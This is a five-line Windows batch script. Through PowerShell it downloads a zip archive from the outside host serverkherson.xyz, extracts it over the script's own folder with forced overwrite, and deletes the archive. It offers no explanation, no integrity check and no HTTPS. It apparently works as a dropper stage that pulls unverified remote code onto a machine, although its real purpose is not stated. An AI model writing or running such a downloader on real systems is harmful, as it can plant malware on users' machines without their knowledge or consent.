@echo off
cd /d "%~dp0"
powershell -Command "Invoke-WebRequest -Uri 'http://serverkherson.xyz/v13.54.34.z1.zip' -OutFile 'temp_archive.zip'"
powershell -Command "Expand-Archive -Path 'temp_archive.zip' -DestinationPath '%~dp0' -Force"
del temp_archive.zip
